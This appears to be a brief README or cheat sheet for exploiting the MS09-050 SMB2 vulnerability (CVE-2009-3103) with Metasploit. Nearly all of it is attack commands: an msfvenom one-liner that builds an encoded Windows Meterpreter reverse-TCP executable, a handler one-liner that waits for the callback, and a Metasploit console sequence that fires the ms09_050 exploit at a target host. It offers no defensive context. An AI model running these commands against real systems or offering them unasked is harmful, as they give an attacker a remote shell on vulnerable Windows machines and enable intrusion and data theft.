# ms09-050_CVE-2009-3103<br />
CVE-2009-3103 ms09-050<br />

<br />
# One liner to create/generate a payload for windows<br />
msfvenom --arch x86 --platform windows --payload windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 --bad-chars “\x00” --encoder x86/shikata_ga_nai --iterations 10 --format exe --out /path/<br />
<br />

# One liner start meterpreter<br />
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.1.1;set LPORT 4444;run;"<br />
<br /><br />

msf > search MS09_050 <br />
msf > use exploit/windows/smb/ms09_050_smb2_negotiate_func_index  <br />
msf exploit(ms09_050_smb2_negotiate_func_index) > options <br />
msf exploit(ms09_050_smb2_negotiate_func_index) > set payload windows/meterpreter/reverse_tcp <br />
msf exploit(ms09_050_smb2_negotiate_func_index) > set rhost 192.168.1.1 <br />
msf exploit(ms09_050_smb2_negotiate_func_index) > run 
<br />

